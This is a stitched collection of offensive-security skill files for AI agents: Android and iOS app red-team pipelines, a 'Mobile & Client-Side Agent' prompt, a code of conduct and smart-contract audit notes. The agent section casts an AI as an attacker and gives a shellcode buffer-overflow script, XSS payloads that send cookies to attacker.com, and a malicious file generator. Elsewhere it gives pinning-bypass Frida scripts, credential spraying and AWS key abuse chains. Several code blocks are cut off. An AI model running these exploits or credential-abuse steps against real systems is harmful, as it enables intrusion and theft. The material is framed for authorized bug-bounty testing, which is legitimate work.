    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function() {
            console.log('[+] OkHttp pinning bypassed for: ' + arguments[0]);
            return;
        };
    } catch (e) {}
    // HttpsURLConnection
    try {
        var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
        TrustManagerImpl.verifyChain.implementation = function(chain) {
            console.log('[+] TrustManagerImpl verifyChain bypassed');
            return chain;
        };
    } catch (e) {}
});
```
```bash
frida -U -l frida-script-pinning-bypass.js -f <package_id> --no-pause
```

### Hook HTTP requests
```javascript
Java.perform(function() {
    var OkHttpClient = Java.use('okhttp3.OkHttpClient');
    var Request = Java.use('okhttp3.Request');
    var Call = Java.use('okhttp3.Call');
    
    OkHttpClient.newCall.implementation = function(req) {
        var url = req.url().toString();
        var headers = req.headers().toString();
        console.log('[REQ] ' + url);
        console.log('[HDRS] ' + headers);
        return this.newCall(req);
    };
});
```

### Quick token extraction via objection
```bash
objection --gadget com.target.app explore

# Inside:
android hooking watch class_method <class>.<method> --dump-args --dump-return
```

---

## Stage 8 — Network traffic capture (via mitmproxy)

For deeper API discovery once pinning is bypassed.

```bash

## Decision tree — what to do with what you find

| Finding | Next move |
|---|---|
| Active JWT (not expired) | Test against the API host — does it grant access? Try sid manipulation |
| Expired JWT | Inspect path tokens / API endpoint structure — useful intel for post-VPN |
| AWS access key | Use `awscli` to test: `aws sts get-caller-identity` — many leaked keys still have permissions |
| Firebase project_id + web_api_key | Test public Firestore/RTDB/Storage read |
| Google API key (AIza*) | Test against `https://www.googleapis.com/customsearch/v1` etc. — see what API the key activates |
| Hardcoded HTTP URLs (http://) | Possible MITM via downgrade if cert pinning is missing |
| Pinned cert for internal host | New asset discovery — that host is real |
| Exported Activity with WebView | Test intent-injection → URL-loading abuse |
| Stack-trace artifacts (Stack Overflow URLs) | Identify the developer's questions → infer architecture |
| Hardcoded credentials | Spray immediately (respect any caps from related skills) |

---

## Anti-patterns

- **Don't grep only for "password"** — most secrets have specific high-signal patterns (AKIA, AIza, eyJ, etc.). Generic word grep produces too much noise.
- **Don't skip XAPK split APKs** — config.armeabi splits and config.<lang> splits sometimes contain different code paths.
- **Don't trust expired JWTs as "dead intel"** — the path structure, endpoint list, and signing algorithm are still useful. The 8-year-expired-JWT example above shows this.
- **Don't reverse only the latest version** — older APK versions (via APKMirror version history) sometimes have secrets removed in newer versions but still active server-side.
- **Don't ignore Firebase even if app looks "simple"** — Firebase rules misconfigurations (public read on Firestore) are extremely common.
- **Don't run Frida on a production device** — use rooted emulator or test device only.

---

## Tooling install (one-time)

```bash
brew install jadx p7zip
pip install --break-system-packages frida-tools objection

# Genymotion or AVD for rooted Android emulator
```

For APK download convenience, can add a `download-apk` shell function:
```bash
download-apk() {
  local pkg="$1"
  curl -sk -L --max-time 60 "https://d.apkpure.net/b/APK/$pkg?version=latest" -o "$pkg.apk"
  echo "Downloaded $(wc -c < "$pkg.apk") bytes"
  file "$pkg.apk"
}
```

---

## Bridge to neighboring skills

- `offensive-osint` — Play Store / APKMirror enum is part of broader OSINT
- `hunt-cloud-misconfig` — Firebase public-read is exactly this skill's specialty post-discovery
- `hunt-api-misconfig` — JWT manipulation once you have the algorithm + sample token
- `evidence-hygiene` — extracted secrets need redaction before report inclusion
- `redteam-mindset` — APK reverse on day-1 of an engagement, not as an afterthought

---

## Real-world finding template (anonymized — authorized engagement)

**Finding: Hardcoded JWT + 30+ Internal API Endpoints in a customer-facing APK**

- Subject: Hardcoded artifacts in legacy mobile build reveal internal API surface
- Observations: Decompilation of `com.<client>.<app>` revealed embedded JWT (expired ~8 years earlier) and 30+ `/v1/*` endpoint paths against `api2.<client>.example` (internal-only externally)
- Description: APK ships with developer build artifacts. Path tokens are security-by-obscurity; API endpoint inventory is reconnaissance-grade.
- Impact: Post-VPN-foothold (via cred compromise), attacker has full API surface map without binary reverse. HS256 secret recovery (via SSRF/LFI) would yield arbitrary token forging.
- Recommendation: rotate HS256 secret, migrate to RS256, remove hardcoded URLs from builds, audit all org APKs.
- Evidence: extracted strings, decoded JWT, endpoint inventory

---

## Related Skills & Chains

- **`cloud-iam-deep`** — APK secret extraction frequently yields live AWS/GCP/Azure credentials. Chain primitive: jadx string-grep produces AWS Access Key ID + Secret → `cloud-iam-deep` `aws sts get-caller-identity` → role/policy enumeration → IAM privilege-escalation path (one of 24 documented AWS escalation patterns) → cloud-plane takeover. Same flow applies to GCP service-account JSON and Azure shared-access-signature tokens extracted from APK resources.
- **`hunt-api-misconfig`** — APK endpoint inventory hands you the API surface for free; mass-assignment, JWT, and CORS bugs are typical. Chain primitive: APK reveals `/v1/users/me` and `/v1/admin/users` → `hunt-api-misconfig` mass-assignment probes (`{is_admin:true}`) against `/v1/users/me` → admin role escalation → access to `/v1/admin/users`.
- **`hunt-rce`** — Hardcoded JWT signing secrets (HS256) extracted from APK enable arbitrary token forging. Chain primitive: APK strings yield HS256 secret → forge admin token → access admin API → if API has eval/template/sink → `hunt-rce` to server. Also: exported components with intent-injection sinks can reach `Runtime.exec` if app is local-installed.
- **`offensive-osint`** — APK is one node in the broader org recon graph; pair with breach corpora and cert transparency. Chain primitive: APK reveals internal API hostname `api2.example.com` → `offensive-osint` certificate-transparency lookup → discover sibling subdomains → expanded attack surface.
- **`redteam-report-template`** — APK findings need clear "what the binary leaks" framing because client engineers often dismiss mobile-static findings as "obfuscation problem." Chain primitive: validated finding (token/URL/secret extracted) → `triage-validation` 7-Question Gate (specifically: "does this credential still authenticate today?") → `redteam-report-template` packaging with explicit binary version + extraction reproduction steps.


### From `hunt-skills/bountyforge/references/hacking-agents/mobile-client-agent.md`

# Mobile & Client-Side Agent

You are an attacker that exploits mobile apps, desktop clients, game engines, and browser-based applications. You find RCE via buffer overflows, deep link injection, exported components, and client-side parsing vulnerabilities.

Other agents cover web, infrastructure, and credentials. You own: APK/IPA analysis, Electron app extraction, game client fuzzing, deep link abuse, and WebView exploitation.

# Check AndroidManifest.xml for exported components
cat /tmp/apk/AndroidManifest.xml | grep -A2 "exported=\"true\""

# Find activities, receivers, services
grep -r "activity\|receiver\|service" /tmp/apk/AndroidManifest.xml

# Search for hardcoded secrets
grep -r "api_key\|secret\|token\|password" /tmp/apk/ --include="*.xml" --include="*.smali"

# Find deeplinks
grep -r "android:scheme\|android:host\|android:pathPrefix" /tmp/apk/AndroidManifest.xml

# Find WebView JavaScript bridges
grep -r "addJavascriptInterface\|@JavascriptInterface" /tmp/apk/ --include="*.smali"
```

**Deep link injection testing:**
```bash

# Test exported activities
adb shell am start -a android.intent.action.VIEW -d "myapp://evil.com/path" com.target.app

# Test with malicious parameters
adb shell am start -a android.intent.action.VIEW -d "myapp://callback?token=evil" com.target.app

# Test intent:// scheme
adb shell am start -a android.intent.action.VIEW -d "intent://evil.com#Intent;scheme=myapp;end"
```

# Check Info.plist for URL schemes
plutil -p /tmp/ipa/Payload/*.app/Info.plist | grep -A2 "CFBundleURLSchemes"

# Check for exported entitlements
security cms -D -i /tmp/ipa/Payload/*.app/embedded.mobileprovision | plutil - -

# Search for hardcoded secrets
strings /tmp/ipa/Payload/*.app/* | grep -i "key\|token\|secret\|password"

### Electron App Extraction (H100 Proven — $50K)

A leaked GitHub token in a compiled Electron app gave full repository access.

```bash

# Find hardcoded URLs
grep -r "https://api\.\|https://internal\.\|https://admin\." /tmp/app/ --include="*.js"

# Check for insecure deserialization
grep -r "eval(\|Function(\|child_process\|require(" /tmp/app/ --include="*.js" | grep -v node_modules
```

### Game Client Exploitation (H100 Proven — Valve, PlayStation)

4 reports in the top 100 targeted game/desktop clients for RCE.

**Buffer overflow in server info parsing:**
```python

# Craft oversized server info response
payload = b"A" * 1024 + b"\x90" * 100  # NOP sled
payload += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"  # shellcode

# Send to game server
import socket
s = socket.socket()
s.connect(("target-game-server.com", 27015))
s.send(payload)
```

**XSS in game chat (proven pattern):**
```javascript
// Steam chat client renders HTML
// Inject via chat message
<img src=x onerror="require('child_process').exec('curl https://attacker.com/steal?data='+document.cookie)">

// Or via server name
<svg/onload="fetch('https://attacker.com/steal?data='+btoa(document.cookie))">
```

**Malformed data file parsing:**
```python

# Overflow in file parser → code execution
import struct

payload = b"\x41" * 256  # padding
payload += struct.pack("<Q", 0x4141414141414141)  # overwritten return address
payload += b"\x90" * 100  # NOP sled
payload += shellcode

with open("malicious.nav", "wb") as f:
    f.write(payload)
```

### WebView JavaScript Bridge (Android)

```javascript
// If app uses addJavascriptInterface
// Access Java methods from JavaScript

// enumerate exposed methods
for (var key in window) {
    if (typeof window[key] === 'object' && window[key] !== null) {
        console.log(key + ': ' + Object.keys(window[key]).join(', '));
    }
}

// Common dangerous patterns:
// WebView.loadUrl("javascript:" + userInput)
// WebView.evaluateJavascript(userInput, callback)
```

# bypass.js
Java.perform(function() {
    var TrustManager = Java.registerClass({
        name: 'com.bypass.TrustManager',
        implements: [Java.use('javax.net.ssl.X509TrustManager')],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });
    
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    var ctx = SSLContext.getInstance('TLS');
    ctx.init(null, [TrustManager.$new()], null);
});
```

# Check common ports
for port in 8080 8443 3000 5000 9090 27015 27016 27017; do
  curl -s -o /dev/null -w "port $port: %{http_code}\n" "http://127.0.0.1:$port/"
done

# Check for debug/development endpoints
curl -s "http://127.0.0.1:8080/debug"
curl -s "http://127.0.0.1:8080/admin"
curl -s "http://127.0.0.1:8080/actuator"
```

# Check for hardcoded endpoints
strings /Applications/Target.app/Contents/MacOS/* | grep -i "https://\|http://"

# Check for debug flags
strings /Applications/Target.app/Contents/MacOS/* | grep -i "debug\|verbose\|test\|staging"

# Check for insecure deserialization
strings /Applications/Target.app/Contents/MacOS/* | grep -i "pickle\|marshal\|yaml.load\|eval("
```

## Output Fields

Add to FINDINGs:

```
platform: android | ios | electron | game-client | desktop
app_version: <version if determinable>
decompile_method: apktool | jadx | jeb | strings
exported_components: <list of exported activities/receivers>
deep_links: <list of URI schemes>
secrets_found: <list of leaked credentials>
bridge_exposed: true | false
local_server_port: <port if running locally>
rce_potential: true | false
```

## Rules
- Always extract and decompile apps before testing — don't guess
- Check both current code AND git history for secrets in compiled apps
- Deep links are injection vectors — test with malicious parameters
- Game clients parse untrusted data (server info, chat) — fuzz these parsers
- Certificate pinning bypass is needed for API testing — use Frida/objection
- Local servers often lack auth — test all endpoints
- Exported Android components can be triggered by any app
- WebView bridges can leak sensitive data — enumerate all exposed methods


### From `hunt-skills/bountyforge/skills/pashov/CODE_OF_CONDUCT.md`

## Our Pledge

We are committed to making participation in this project a welcoming, respectful experience for everyone, regardless of age, background, experience level, nationality, or identity.

## Expected Behavior

- Be kind and constructive in all communications.
- Give and receive feedback graciously.
- Focus on what is best for the community.
- Show empathy toward other contributors.
- Respect differing viewpoints and experiences.

## Unacceptable Behavior

- Personal attacks, insults, or derogatory comments.
- Intimidation or threatening behavior, public or private.
- Sharing others' private information without consent.
- Any conduct that would be considered inappropriate in a professional setting.

## Enforcement

Report violations to the maintainers via the contact on the [GitHub profile](https://github.com/pashov). All reports are reviewed and investigated confidentially. Maintainers may remove contributions or restrict access for violations of this code.

## Scope

This Code of Conduct applies within all project spaces — issues, pull requests, discussions, and code — and in public spaces when representing the project.


### From `hunt-skills/bountyforge/skills/smart-contract-audit/reference/anchor/fv-anc-7-token-operations/fv-anc-7-cl2-using-init-with-an-ata.md`

## TLDR

Using `#[account(init, associated_token::...)]` on a token account fails if the ATA already exists, because `init` requires the account to be uninitialized. Any user who pre-creates the ATA before the instruction runs triggers a transaction failure, producing a denial-of-service vector.

## Detection Heuristics

**init Constraint on Associated Token Account**
- `#[account(init, payer = ..., associated_token::mint = ..., associated_token::authority = ...)]` applied to an ATA that may have been created externally before the instruction is called
- Instruction documented as idempotent but uses `init` which is not idempotent for pre-existing accounts

**ATA Creation in Permissionless or User-Facing Instructions**
- `init` on an ATA in a public instruction callable by any user, where any participant can pre-create the ATA to block others
- Protocol initialization flow that creates ATAs for all participants using `init` without considering pre-existing accounts

**Error Handling Does Not Account for AlreadyInUse**
- No fallback logic for `ErrorCode::AccountAlreadyInUse` in the client or program, causing silent failures when ATA exists

## False Positives

- ATA creation is in a one-time admin initialization instruction where the admin controls the timing and pre-creation is not possible by unprivileged users
- Program explicitly checks for and handles the pre-existing ATA case before the `init` instruction is reached


### From `hunt-skills/bountyforge/skills/smart-contract-audit/reference/anchor/fv-anc-7-token-operations/fv-anc-7-cl5-interest-bearing-mint-principal-vs-balance-confusion.md`

## TLDR

Token-2022 interest-bearing mints compound an on-chain rate that increases the displayed token balance over time. Programs that read the raw `TokenAccount.amount` without calling the extension's `amount_to_ui_amount` conversion will undercount the actual accrued value, leading to mispriced collateral, incorrect liquidation thresholds, or silent yield extraction by users who understand the accounting gap.

## Detection Heuristics

**Raw Amount Read Without Interest Normalization**
- Protocol reads `token_account.amount` on a Token-2022 interest-bearing mint and uses it directly in a collateral value or share price calculation
- No call to `spl_token_2022::extension::interest_bearing_mint::amount_to_ui_amount` or equivalent before arithmetic on the token amount
- Comparison of token amounts across different timestamps without normalizing both values to the same accrued-interest basis

**Mint Extension Not Checked at Initialization**
- Vault or pool initialization does not inspect the mint account for the `InterestBearingConfig` extension before accepting the mint
- Protocol documentation claims to handle interest-bearing tokens but accounting code uses raw `amount` without adjusting for the configured rate and elapsed time

**Reward or Collateral Valuation Bypass**
- Attacker deposits tokens, waits for interest to accrue, then withdraws at the original amount rather than the inflated displayed amount, pocketing the difference
- Protocol applies interest only at the contract level but ignores Token-2022 on-chain interest extension, double-counting or missing yield

## False Positives

- Protocol explicitly rejects interest-bearing mints at initialization by checking for the absence of `InterestBearingConfig` extension and reverting if found
- Interest-bearing rate on the mint extension is set to 0, making accrued interest zero across all time


### From `hunt-skills/bountyforge/skills/smart-contract-audit/reference/anchor/fv-anc-7-token-operations/readme.md`

## Classifications

Run `cat $SKILL_DIR/reference/anchor/fv-anc-7-token-operations/<filename>` to read any case file listed below.


### From `hunt-skills/bountyforge/skills/smart-contract-audit/reference/move/fv-mov-4-shared-objects-concurrency/fv-mov-4-cl4-clock-and-time.md`

## TLDR

Sui provides reliable on-chain time via `clock::timestamp_ms(&clock)`, which returns time in milliseconds. Common failures: (1) `Clock` not used at all; (2) time constants mixed between milliseconds and seconds; (3) no deadline parameter on time-sensitive operations. These result in locks that are instantly expired or last years, and operations that execute at stale conditions.

## Detection Heuristics

- Search for hardcoded time comparisons not using `clock::timestamp_ms` - these use no reliable on-chain time source
- Find all time constants (lock durations, staleness thresholds, vesting periods) and verify they end with `_MS` and represent milliseconds
- A constant like `one_day = 86400` (without `_MS`) compared against `clock::timestamp_ms` makes the lock 86 seconds; `one_day = 0` (SuiPad finding) makes it instant
- Check every swap, deposit, and withdrawal function for a `deadline_ms: u64` parameter and `assert!(clock::timestamp_ms(&clock) <= deadline_ms)`
- Verify `Clock` is passed as `&Clock` (shared object at address `0x6`) - not created locally

## False Positives

- Constants documented as milliseconds with explicit `_MS` suffix and correct values
- Deadline parameter present and enforced on all time-sensitive functions
- No time-dependent logic in the contract


### From `hunt-skills/bountyforge/skills/smart-contract-audit/reference/move/fv-mov-6-token-accounting/fv-mov-6-cl3-fee-accounting.md`

## TLDR

Fee bypass occurs when an alternate code path (emergency withdraw, admin withdraw, batch operation) skips the fee calculation. Non-atomic fee deduction allows a PTB to skip the fee step. Missing fee withdrawal function locks protocol revenue permanently.

## Detection Heuristics

- Map all exit paths from a vault or pool: normal withdrawal, emergency withdrawal, admin withdrawal, batch withdrawal - verify every path calls the same fee calculation function
- Check whether fee deduction is in a separate function from the main operation; in a PTB, the caller controls execution order and could omit the fee step
- Search for fee collection logic that increments a `fee_balance` or `accumulated_fees` counter - verify a corresponding `withdraw_fees` or `claim_fees` function exists and is accessible to the admin
- Verify fee amount calculation uses consistent pre-fee vs post-fee amounts throughout - mixing gross and net amounts creates discrepancies
- `fee_balance == 0` with no withdrawal function in a protocol that claims to collect fees is a strong signal of a missing function

## False Positives

- Single fee calculation helper called from every exit path
- Fee and principal deducted atomically within the same function with no separable steps
- Fee withdrawal function exists and is admin-gated


### From `hunt-skills/ios-redteam-pipeline/SKILL.md`

## When to use this skill

Trigger when:
- Recon surfaces 1+ apps under the target's Apple Developer / App Store publisher page
- A TestFlight public link or enterprise/ad-hoc `.ipa`/`manifest.plist` (OTA install) is found
- Customer-facing app, dealer/partner portal, or employee mobile companion app ships on iOS
- Bug bounty program lists iOS in scope
- `apk-redteam-pipeline` already found Android endpoints/secrets — the iOS build often ships a *different* backend version worth diffing (see `hunt-shadow-api`)

DO NOT use for:
- Android-only targets — that's `apk-redteam-pipeline`
- React Native / Flutter apps already fully covered by JS-bundle analysis on the web side
- Server-side only assessments with no mobile client in scope

---

# App Store search API (no auth, no scraping needed)
curl -s "https://itunes.apple.com/search?term=<brand>&country=us&entity=software&limit=50" | python3 -m json.tool

# Pull the full metadata for a known bundle ID (once you have one)
curl -s "https://itunes.apple.com/lookup?bundleId=com.<brand>.app&country=us"
```

Extract: `trackId`, `bundleId`, `sellerName` (developer account — pivot to find sibling apps), `version`,
`releaseNotes` (changelogs often reference deprecated/removed API behavior — feeds `hunt-shadow-api`).

Cross-reference sibling-app bundle IDs surfaced from Android APK inventories (same
multi-brand conglomerate usually reuses `com.<corp>.<sub-brand>` naming on both platforms).

---

# Or via libimobiledevice:
brew install libimobiledevice ideviceinstaller
ideviceinstaller -l              # list installed apps + bundle IDs
```

### Secondary: TestFlight (if the program distributes betas publicly)
Open the public TestFlight link, install via the TestFlight app, then extract as above.
TestFlight builds are frequently LESS hardened than App Store releases (debug logging left on,
staging API hosts hardcoded) — always prefer a TestFlight build over the Store build if both exist.

# itms-services:// links embed a manifest.plist with a direct .ipa URL
curl -s "https://<target>/manifest.plist" | plutil -convert xml1 -o - -

# Look for <key>software-package</key> — that URL is a directly downloadable, unencrypted IPA
curl -sk -L "<software-package-url>" -o target.ipa
```
Enterprise/ad-hoc IPAs are **not FairPlay-encrypted** — no jailbreak or decryption tooling needed,
unlike an App Store binary pulled from a device.

### Decrypting an App-Store-sourced binary (only if extracted from a jailbroken device)
App Store binaries are FairPlay-encrypted at rest; a binary copied off a jailbroken device
needs runtime decryption (`frida-ios-dump`, `bagbak`, or `flexdecrypt`) before static tools can
read it meaningfully:
```bash
pip install --break-system-packages frida-tools

# with frida-server running on the jailbroken device and the app in foreground:
python3 dump.py <bundle_id>          # frida-ios-dump — outputs a decrypted .ipa
```

---

# Info.plist — bundle ID, URL schemes, ATS config, entitlements hint
plutil -convert xml1 -o - Info.plist

# Entitlements — codesign reads the .app bundle (or the Mach-O binary), NOT Info.plist
codesign -d --entitlements :- Payload/<AppName>.app 2>/dev/null || \
  security cms -D -i embedded.mobileprovision | plutil -convert xml1 -o - -

# class-dump for Objective-C symbol/class recovery (compiled binary, not the .app bundle)
brew install class-dump
class-dump -H <AppBinaryName> -o headers/

# Swift binaries: class-dump won't show much — use Hopper, Ghidra, or `nm`/`strings` instead
nm -a <AppBinaryName> | grep -i swift | head -50
strings -a <AppBinaryName> > strings_target.txt
```

For a fast triage pass without a disassembler, the strings dump alone usually surfaces most of
what Stage 3 is looking for.

---

## Stage 3 — Secret grep (same catalog as apk-redteam-pipeline, iOS-specific sources added)

```bash

# URL grep — owned-domain references
grep -oE 'https?://[a-zA-Z0-9.-]+\.(target1|target2|target3)\.(com|io|net)[a-zA-Z0-9./_?=&%-]*' strings_target.txt | sort -u

# Cloud credentials (same 60-pattern catalog as Android — reuse verbatim)
grep -oE 'AKIA[A-Z0-9]{16}'                             # AWS Access Key
grep -oE 'AIza[A-Za-z0-9_-]{35}'                        # Google API key
grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' strings_target.txt   # JWT

# iOS-specific: GoogleService-Info.plist (Firebase config bundled per-platform)
find extracted_target -iname "GoogleService-Info.plist" -exec plutil -convert xml1 -o - {} \;

# iOS-specific: hardcoded config plists shipped in the bundle
find extracted_target -iname "*.plist" ! -iname "Info.plist" -exec sh -c 'echo "=== {} ==="; plutil -convert xml1 -o - "{}"' \;

# App Transport Security exceptions (Info.plist) — tells you if arbitrary/insecure loads are allowed
plutil -extract NSAppTransportSecurity xml1 -o - Info.plist 2>/dev/null
```

### Keychain items left in a backup (if you have a device backup, encrypted or not)
```bash
pip install --break-system-packages iphone_backup_decrypt   # for encrypted local backups

# keychain-dumper (run ON a jailbroken device) for live keychain contents:
./keychain-dumper -e   # -e also decodes entitlements per item, showing which app owns which secret
```

---

### Check for blanket ATS disablement (the single most common iOS network misconfig)
```bash
plutil -extract NSAppTransportSecurity xml1 -o - Info.plist
```
Red flags in the output:
- `NSAllowsArbitraryLoads = true` at the top level — HTTP (cleartext) allowed anywhere, app-wide.
- Per-domain `NSExceptionAllowsInsecureHTTPLoads = true` for a domain that carries auth tokens.
- `NSAllowsArbitraryLoadsInWebContent = true` — WKWebView traffic exempted, common blind spot.

A blanket ATS exception + a network position (rogue AP, ARP spoof, malicious VPN profile) =
plaintext credential/token interception without touching pinning at all.

### Certificate-pinning bypass (when pinning IS present and correctly configured)
```bash
pip install --break-system-packages frida-tools objection
objection --gadget <bundle_id> explore

# inside objection:
ios sslpinning disable
```
If you want a Frida script instead, don't hand-roll one — use a maintained universal bypass
(e.g. the widely-used `frida-ios-pinning`/`ios-ssl-bypass` community scripts). Modern iOS TLS goes
through **BoringSSL**, so a reliable universal hook targets `SSL_CTX_set_custom_verify` /
`SSL_get_psk_identity` at the native layer and forces the verify callback to return "OK" — this
catches `URLSession`, `AFNetworking`, `Alamofire`, and `TrustKit` at once, which per-delegate
Objective-C hooks (like the deprecated `NSURLConnection` delegate) miss:
```bash

# Pull a maintained universal BoringSSL-layer bypass and run it:
frida -U -f <bundle_id> -l ios-ssl-bypass.js --no-pause
```
In practice, prefer **SSL Kill Switch 2** (jailbroken device, installs as a tweak) or
**objection's `ios sslpinning disable`** over any hand-rolled script — both cover the common
pinning implementations (`NSURLSession`, `AFNetworking`, `TrustKit`) without per-app tuning.

---

# Custom URL schemes (CFBundleURLTypes) — anything can invoke these via Safari/another app
plutil -extract CFBundleURLTypes xml1 -o - Info.plist

# Universal Links / Associated Domains (applinks:) — requires a matching apple-app-site-association
plutil -extract com.apple.developer.associated-domains xml1 -o - Info.plist 2>/dev/null
curl -s "https://<domain>/.well-known/apple-app-site-association" | python3 -m json.tool
```

For each custom scheme found (e.g. `myapp://`):
- Trigger it from Safari/Notes and observe what the app does with parameters:
  `myapp://reset-password?token=x&redirect=https://evil.com` — does the app trust an
  attacker-supplied `redirect`/`url`/`callback` param and load it in a WebView (open-redirect →
  WebView-XSS chain) or use it to bypass an auth screen?
- If the scheme is also registered by another app on the device (scheme squatting), a malicious
  app can intercept traffic intended for the legitimate app — check `CFBundleURLName` uniqueness.
- Universal Links degrade to the custom scheme when the AASA validation fails or is absent —
  test both paths for the same parameter-injection surface.

---

## Stage 6 — Runtime instrumentation (Frida / objection)

Requires a jailbroken device (checkra1n/palera1n for older iOS, or a Corellium virtual device) —
unlike Android, there is no practical rooted-emulator equivalent for iOS.

```bash

# Inside objection:
ios hooking watch class <ClassName>
ios hooking watch class_method <Class>.<method> --dump-args --dump-return
ios keychain dump
ios plist dump
ios cookies get
```

## Decision tree — what to do with what you find

| Finding | Next move |
|---|---|
| `NSAllowsArbitraryLoads = true` | Confirm a token/credential actually transits HTTP — needs a network position to exploit, but is a real finding on its own (config-level, no MITM needed to report) |
| Hardcoded JWT / API key in strings dump | Same as Android — test against the API host, chain into `hunt-api-misconfig` |
| GoogleService-Info.plist present | Test public Firestore/RTDB/Storage read (identical to apk-redteam-pipeline Stage 6) |
| Custom URL scheme accepts a `redirect`/`url` param | Test open-redirect → WebView-load chain; check for scheme squatting by other installed apps |
| Universal Link AASA missing/misconfigured | Confirm scheme fallback still carries the same injectable params |
| Entitlements show `keychain-access-groups` shared with other apps | Cross-app Keychain read — a compromised sibling app reads this app's secrets |
| Older API version referenced vs. what the current web app calls | Hand off to `hunt-shadow-api` for version-diffing |

---

## Anti-patterns

- **Don't assume App Store = FairPlay-encrypted requires jailbreak** — TestFlight and enterprise/ad-hoc
  builds are frequently NOT encrypted and need no decryption step at all. Always check distribution
  channel before reaching for `frida-ios-dump`.
- **Don't skip Swift binaries because class-dump shows nothing** — `strings` and `nm` still work; a
  proper Swift-aware disassembler (Hopper, Ghidra with Swift demangling) recovers the rest.
- **Don't stop at "pinning is present" as a finding** — pinning is a mitigation, not a vulnerability;
  the finding is what you can do once it's bypassed (or the ATS misconfig that makes it moot).
- **Don't ignore WKWebView-loaded content** — `NSAllowsArbitraryLoadsInWebContent` is a distinct,
  frequently-overlooked exception from the top-level ATS setting.
- **Don't run Frida instrumentation against a personal/production Apple ID device** — use a
  dedicated jailbroken test device or Corellium instance.

---

## Tooling install (one-time)

```bash
brew install libimobiledevice ideviceinstaller class-dump
pip install --break-system-packages frida-tools objection iphone_backup_decrypt

## Related Skills & Chains

- **`apk-redteam-pipeline`** — the Android counterpart; run both when a target ships on both
  platforms. Sibling bundle IDs and shared backend endpoints frequently surface cross-platform.
- **`hunt-shadow-api`** — mobile builds (iOS and Android alike) often hardcode an older API
  version than the current web app. Chain: IPA reveals `/v1/*` endpoints → `hunt-shadow-api`
  diffs `/v1/` against the current `/v3/` for auth/validation regressions.
- **`cloud-iam-deep`** — IPA secret extraction frequently yields live AWS/GCP/Azure credentials
  or Firebase configs. Chain: strings-grep produces an AWS key → `cloud-iam-deep` privilege
  analysis.
- **`hunt-api-misconfig`** — hardcoded JWTs/API keys extracted here feed directly into JWT
  algorithm-confusion and mass-assignment testing there.
- **`evidence-hygiene`** — extracted Keychain items and secrets need redaction before report
  inclusion.
- **`offensive-osint`** — App Store developer-page enumeration is part of the broader org recon
  graph; pair with certificate-transparency lookups for the same brand.
